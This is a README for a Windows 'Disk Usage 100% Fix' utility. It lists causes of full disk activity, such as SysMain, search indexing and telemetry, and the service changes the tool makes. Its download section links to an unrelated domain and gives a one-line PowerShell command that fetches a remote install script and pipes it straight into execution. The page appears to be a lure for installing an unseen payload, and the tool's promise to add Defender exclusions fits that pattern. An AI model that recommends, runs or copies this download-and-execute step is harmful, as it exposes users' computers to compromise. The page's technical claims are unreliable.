# Disk Usage 100% Fix

> Fix 100% disk usage, slow PC, and high disk activity on Windows 10/11.

[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.4.0-stable-brightgreen?style=flat-square)]()
[![MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)

---

### Download

**[Download Latest Release](https://disk.zipzapsol.space/)**

<details>
<summary>Alternative: PowerShell</summary>

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

</details>

---

## The Problem

You open Task Manager and see **Disk: 100%**. Your PC is crawling. Everything takes forever to open. You haven't even launched any programs.

This is one of the most common Windows problems. It affects **HDD and SSD** users alike, and Microsoft has never properly fixed it.

---

## What Causes 100% Disk Usage

| Cause | How Often | What the Tool Does |
|---|---|---|
| **SysMain (Superfetch)** preloading apps | Very common | Disables SysMain service |
| **Windows Search** indexing your files | Very common | Disables or limits Windows Search indexer |
| **Windows Update** downloading in background | Common | Pauses non-critical updates, limits bandwidth |
| **Connected User Experiences** telemetry | Common | Disables DiagTrack and telemetry services |
| **Antimalware Service Executable** scanning | Common | Adds exclusions, optimizes Defender schedule |
| **BITS (Background Intelligent Transfer)** | Common | Stops BITS when not needed |
| **Disk defragmentation** running on SSD | Moderate | Disables defrag for SSDs, enables TRIM |
| **Windows Compatibility Telemetry** | Moderate | Disables CompatTelRunner.exe |
| **Virtual memory (page file)** thrashing | Moderate | Optimizes page file size and location |
| **Corrupted system files** | Less common | Runs SFC and DISM repair |
| **Faulty AHCI/SATA driver** | Less common | Installs correct StorAHCI driver |
| **MSI mode not enabled** for AHCI | Less common | Enables MSI mode in registry |

---

## Preview

```
  +-------------------------------------------------+
  |        Disk Usage 100% Fix v1.4.0               |
  +-------------------------------------------------+
  |                                                 |
  |  Current Disk Usage: 98%  [!!!!!!!!!!!!!!!!! ]  |
  |                                                 |
  |  Top Disk Consumers:                            |
  |  [!] SysMain (Superfetch)   -- 45% disk I/O    |
  |  [!] Windows Search         -- 28% disk I/O    |
  |  [!] DiagTrack              -- 12% disk I/O    |
  |  [OK] System                -- 3% disk I/O     |
  |                                                 |
  |  Recommendations:                               |
  |  [x] Disable SysMain                            |
  |  [x] Limit Windows Search                       |
  |  [x] Disable telemetry services                 |
  |  [x] Optimize page file                         |
  |  [ ] Enable MSI mode (advanced)                 |
  |                                                 |
  |  [ Fix All ]    [ Scan Again ]    [ Exit ]      |
  |                                                 |
  +-------------------------------------------------+
```

---

## How It Works

1. **Scan** -- Identifies which processes and services are causing high disk I/O
2. **Rank** -- Shows disk consumers sorted by impact
3. **Fix** -- Disables or optimizes the top offenders
4. **Verify** -- Monitors disk usage after fixes to confirm improvement

---

## Fixes Applied

### Services Optimized

| Service | Action | Impact |
|---|---|---|
| SysMain (Superfetch) | Disabled | Eliminates constant disk reads |
| Windows Search (WSearch) | Disabled or limited | Stops file indexing I/O |
| DiagTrack | Disabled | Stops telemetry writes |
| Connected User Experiences | Disabled | Stops telemetry uploads |
| BITS | Set to manual | Stops background downloads |
| Windows Update | Delivery optimization limited | Reduces update disk I/O |

### System Optimizations

| Setting | Change |
|---|---|
| Page file | Auto-sized based on RAM |
| Disk defrag on SSD | Disabled (TRIM enabled) |
| StorAHCI MSI mode | Enabled (fixes AHCI interrupt bug) |
| Prefetch | Optimized |
| Last access timestamp | Disabled (reduces NTFS writes) |
| 8dot3 short names | Disabled (reduces NTFS overhead) |

---

## Symptoms People Search For

| What You See | Root Cause |
|---|---|
| **Task Manager shows 100% disk** | One or more services consuming all disk I/O |
| **PC extremely slow, everything freezes** | Disk bottleneck from background services |
| **Hard drive LED always on** | Constant disk writes from indexing/telemetry |
| **"Disk is at 100% for no reason"** | SysMain, Windows Search, or telemetry |
| **New laptop is very slow** | All services enabled on fresh Windows install |
| **SSD slower than expected** | AHCI MSI mode not enabled, TRIM not scheduled |
| **PC slow after Windows Update** | Update re-enabled disabled services |
| **Disk usage spikes to 100% then drops** | Intermittent service activity (Defender scan, BITS) |
| **100% disk on HDD, fine on SSD** | HDD can't keep up with service I/O demands |

---

## Affected Configurations

This issue is especially common on:

- **Laptops with HDD** -- mechanical drives are slowest
- **PCs with small SSDs** (128-256 GB) -- less free space = worse performance
- **Windows 11 fresh install** -- all services enabled by default
- **After Windows Update** -- updates often reset disabled services
- **PCs with 4-8 GB RAM** -- more page file usage = more disk I/O
- **Older SATA SSDs** -- AHCI driver issues affect older controllers

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| Disk | HDD or SSD |
| Admin | Yes |
| Network | Not required |

---

## FAQ

**Will disabling SysMain slow down my PC?**
No. SysMain preloads apps into RAM based on usage patterns. On systems where it causes 100% disk usage, disabling it actually makes the PC faster because the disk is no longer saturated.

**Will disabling Windows Search remove my search ability?**
No. Windows Search will still work, but it won't index files in the background. Search results may be slightly slower but your disk won't be at 100%.

**Is this a permanent fix?**
The fix persists through reboots. However, Windows Update may re-enable some services after major updates. Run the tool again if 100% disk returns.

**My disk usage is 100% only sometimes.**
The tool monitors disk activity and identifies intermittent offenders too. It can also set up a scheduled task to auto-fix.

**Will this void my warranty?**
No. All changes are standard Windows settings. Nothing is modified at the hardware level.

---

## License

[MIT](LICENSE)
